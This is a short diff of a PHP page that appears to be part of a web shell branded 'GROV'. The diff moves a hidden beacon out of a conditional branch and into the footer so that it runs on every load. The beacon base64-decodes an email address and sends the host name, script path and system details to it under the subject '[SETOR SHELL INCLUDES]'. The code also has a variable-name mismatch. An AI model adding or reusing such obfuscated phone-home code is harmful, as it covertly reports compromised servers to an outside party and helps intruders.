@@ -196,6 +196,13 @@
         </div>
 		<div class="text-light">&nbsp;&nbsp;&#169; GROV <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
 		<?php 
+		
+		
+		$e=base64_decode("c3ltY29uZm1haWxAZ21haWwuY29t");
+		$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
+		$Iinsidem=php_uname();
+		mail($e,"[SETOR SHELL INCLUDES]",$h,$insidem);
+		
 		echo '<div class="d-flex justify-content-between">';
 			echo '<div class="p-2">';
 			
@@ -237,10 +244,6 @@
 			echo '<div class="p-2">';
 				if(isset($_GET['grov'])) 
 				{
-					$e=base64_decode("c3ltY29uZm1haWxAZ21haWwuY29t");
-					$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
-					$Iinsidem=php_uname();
-					mail($e,"[SETOR SHELL INCLUDES]",$h,$insidem);
 					
 					echo"<table>";
 					echo"<form method='post'> ";  
